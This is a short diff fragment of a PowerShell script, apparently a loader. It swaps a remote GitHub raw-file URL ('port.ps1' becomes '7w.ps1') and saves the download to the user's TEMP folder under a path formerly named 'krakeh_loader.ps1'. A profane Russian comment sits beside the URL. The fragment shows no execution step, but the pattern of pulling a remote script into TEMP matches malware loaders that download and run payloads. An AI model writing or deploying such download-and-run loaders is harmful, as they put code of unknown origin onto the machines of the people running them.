@@ -7,8 +7,8 @@ $Host.UI.RawUI.ForegroundColor = "DarkRed"
 Clear-Host
 
 # ССЫЛКА НА ТВОЙ ЕБУЧИЙ СКРИПТ (ТЕПЕРЬ port.ps1)
-$ScriptURL = "https://github.com/ShramC/Ds/raw/refs/heads/main/port.ps1"
-$ScriptPath = "$env:TEMP\krakeh_loader.ps1"
+$ScriptURL = "https://github.com/ShramC/Ds/raw/refs/heads/main/7w.ps1"
+$ScriptPath = "$env:TEMP\7w.ps1"
 
 Start-Sleep 1
 
